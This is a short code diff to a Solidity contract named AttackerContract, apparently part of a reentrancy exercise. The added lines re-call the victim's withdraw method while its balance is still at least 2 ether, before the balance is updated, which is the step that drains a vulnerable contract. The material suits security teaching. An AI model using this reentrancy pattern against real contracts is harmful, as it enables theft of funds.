@@ -34,6 +34,9 @@ contract AttackerContract {
         console.log("contract balance -> ", Strings.toString(address(target).balance));
         console.log("-------------------");
         // TODO: call the target/victim smart contract's withdraw method
+        if(address(target).balance >= 2 ether) { //call withdraw before balance is updated 
+            target.withdraw();
+        }
     }
 
     // Attack function
